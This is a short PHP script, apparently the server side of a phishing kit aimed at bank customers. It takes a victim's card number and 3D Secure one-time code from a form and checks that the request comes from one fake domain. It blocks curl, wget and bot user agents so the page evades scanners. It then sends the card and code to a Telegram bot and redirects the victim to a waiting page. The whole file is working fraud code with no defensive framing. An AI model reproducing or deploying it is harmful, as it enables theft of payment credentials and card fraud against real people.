<?php
if ($_SERVER['REQUEST_METHOD'] !== 'POST') { http_response_code(405); exit('Method Not Allowed'); }
if (!isset($_SERVER['HTTP_ORIGIN']) || $_SERVER['HTTP_ORIGIN'] !== 'https://kontaktshome.com') { http_response_code(403); exit('Forbidden'); }
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
if (empty($userAgent) || preg_match('/curl|wget|python|bot|spider/i', $userAgent)) { http_response_code(403); exit('Bot detected'); }
$otp = $_POST['otp'] ?? null; $card = $_POST['card'] ?? null;
if (empty($otp) || empty($card)) { http_response_code(400); exit('OTP və Kart nömrəsi tələb olunur.'); }
if (!preg_match('/^[0-9]{4,6}$/', $otp)) { http_response_code(400); exit('Yanlış OTP formatı.'); }
$botToken = 'SIZIN_BOT_TOKEN'; $chatId = 'SIZIN_CHAT_ID'; $message = "3D Secure OTP:\nKart: $card\nOTP: $otp";
$url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message); @file_get_contents($url);
header("Location: wait.html?card=" . urlencode($card)); exit();
?>
